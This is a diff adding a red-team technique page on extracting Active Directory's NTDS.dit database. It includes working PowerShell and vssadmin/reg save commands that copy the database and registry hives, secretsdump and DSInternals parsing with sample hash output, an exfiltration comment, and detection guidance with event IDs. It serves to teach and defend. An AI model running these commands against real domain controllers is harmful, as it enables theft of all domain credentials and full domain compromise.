@@ -1,0 +1,193 @@
+---
+title: NTDS.dit Extraction
+mitre: T1003.003
+category: credential-access
+group: Active Directory Attacks
+summary: Extract all domain credential hashes from the NTDS.dit Active Directory database offline.
+platform: [Windows]
+tags: ['Python', 'PowerShell', 'Active Directory', 'VSS']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: create Volume Shadow Copy (vssadmin / NtIoControlFile)
+    desc: The live NTDS.dit is locked by the AD DS process; a shadow copy gives us an unlocked snapshot.
+    dll: vssapi
+  - call: copy NTDS.dit from shadow volume
+    desc: Grab the database file from the VSS snapshot path.
+    dll: kernel32
+  - call: export SYSTEM hive
+    desc: The SYSTEM registry hive contains the Boot Key (SysKey) needed to decrypt the PEK (password encryption key).
+    dll: advapi32
+  - call: parse offline with secretsdump / DSInternals
+    desc: Decrypt and extract all NTLM hashes, Kerberos keys, and cleartext passwords stored in the database.
+    dll: —
+detections:
+  - src: WINDOWS EID 8222
+    text: Volume shadow copy creation — generated any time a VSS snapshot is created.
+  - src: SYSMON EID 11
+    text: File copy from a VSS snapshot path (\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\...).
+  - src: WINDOWS EID 4648 / 4688
+    text: SYSTEM hive export via reg.exe or reg save — look for reg.exe saving HKLM\SYSTEM.
+  - src: BEHAVIOURAL
+    text: vssadmin.exe or wmic shadowcopy call create run by a non-backup account or outside backup windows.
+related:
+  - mitre: T1003.006
+    title: DCSync
+    desc: Pull the same hashes over the network without touching the filesystem — no shadow copy needed.
+  - mitre: T1558.003
+    title: Kerberoasting
+    desc: Hash extraction from service accounts via Kerberos tickets, requires only domain user access.
+    href: /techniques/credential-access/kerberoasting
+  - mitre: T1003.001
+    title: LSASS Memory Dump
+    desc: Memory-based credential extraction from a running system — no database access needed.
+    href: /techniques/credential-access/lsass-memory-dump
+labKit:
+  - label: impacket secretsdump.py
+    href: 'https://github.com/fortra/impacket'
+  - label: DSInternals PowerShell module
+    href: 'https://github.com/MichaelGrafnetter/DSInternals'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+`NTDS.dit` is the Extensible Storage Engine (ESE) database that Active Directory Domain Services
+uses to store all domain objects, including user accounts and their credential material. On a
+domain controller, it lives at `%SystemRoot%\NTDS\NTDS.dit` and is locked exclusively by the
+`lsass.exe` / `ntdsa.dll` process. Extracting it gives an attacker every NTLM hash and
+Kerberos key in the domain — a full domain compromise in a single operation.
+
+Because the file is locked, the standard extraction path uses Volume Shadow Service (VSS) to
+create a snapshot where the file is accessible. The SYSTEM registry hive must also be captured
+to obtain the Boot Key, which decrypts the Password Encryption Key (PEK) stored in NTDS.
+
+<Callout type="caution">
+  NTDS.dit extraction requires Domain Admin or equivalent rights on a domain controller. If you
+  have reached this step in an engagement, the domain is already fully compromised. Document the
+  finding and stop — do not process the hashes or crack passwords beyond what the engagement
+  scope requires.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Shadow copy method (PowerShell)
+
+<CodeBlock
+  file="ntds_extract.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Run on the Domain Controller as Domain Admin
+# Step 1: Create a volume shadow copy
+$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\\","ClientAccessible")
+$vss    = Get-WmiObject Win32_ShadowCopy | Select-Object -Last 1
+
+# Step 2: Copy NTDS.dit from the shadow volume
+$shadow_path = $vss.DeviceObject + "\\"
+Copy-Item "\${shadow_path}Windows\NTDS\NTDS.dit" C:\Temp\ntds.dit
+Copy-Item "\${shadow_path}Windows\System32\config\SYSTEM"  C:\Temp\SYSTEM
+Copy-Item "\${shadow_path}Windows\System32\config\SECURITY" C:\Temp\SECURITY
+
+# Step 3: Clean up the shadow copy
+$vss.Delete()
+
+# Exfiltrate C:\Temp\ntds.dit, SYSTEM, SECURITY for offline parsing`}
+/>
+
+### vssadmin / reg save (command line)
+
+<CodeBlock
+  file="ntds_cmdline.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Create VSS snapshot
+C:\> vssadmin create shadow /for=C:
+Successfully created shadow copy for 'C:\'
+    Shadow Copy ID: {xxxxxxxx-...}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+# Copy NTDS.dit and registry hives
+C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\
+C:\> reg save HKLM\SYSTEM   C:\Temp\SYSTEM   /y
+C:\> reg save HKLM\SECURITY C:\Temp\SECURITY /y`}
+/>
+
+### Parse offline with impacket secretsdump
+
+<CodeBlock
+  file="parse_ntds.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Parse locally (no DC connection needed)
+$ python3 secretsdump.py -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
+
+[*] Target system bootKey: 0x3c2a...
+[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:c1e75e0bef3d...:::
+jsmith:1104:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+[*] Kerberos keys from ntds.dit
+Administrator:aes256-cts-hmac-sha1-96:a3f2...
+...`}
+/>
+
+### Parse with DSInternals (PowerShell, on-DC)
+
+<CodeBlock
+  file="parse_dsinternals.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`Import-Module DSInternals
+
+# Get boot key from local SYSTEM hive
+$bootKey = Get-BootKey -SystemHivePath C:\Temp\SYSTEM
+
+# Decrypt and dump all accounts
+Get-ADDBAccount -DatabasePath C:\Temp\ntds.dit \`
+    -BootKey $bootKey \`
+    -All |
+    Select-Object SamAccountName, NTHash, KerberosKeys |
+    Format-Table`}
+/>
+
+## Alternative extraction methods
+
+| Method | Mechanism | Requires |
+|---|---|---|
+| VSS + file copy | Snapshot bypasses lock | Admin on DC |
+| `ntdsutil snapshot` | Built-in AD backup tool | Admin on DC |
+| DCSync (Mimikatz) | Replication API, no file access | Domain Admin or DCSync rights |
+| Volume backup API | Uses VSS internally | Admin on DC |
+| Kernel driver direct read | Bypass file lock at Ring 0 | Signed driver + Admin |
+
+**DCSync** is the stealthiest: it uses the Kerberos replication protocol over the network,
+never touches the filesystem, and produces no shadow copy events. It requires the
+`DS-Replication-Get-Changes-All` right, which Domain Admins have by default.
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The combination of EID 8222 (VSS creation) + EID 4688 (reg.exe saving SYSTEM hive) within
+a short time window, from a non-backup account, outside scheduled backup windows, is a
+near-certain indicator. Alert on either event individually; alert immediately on the combination.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
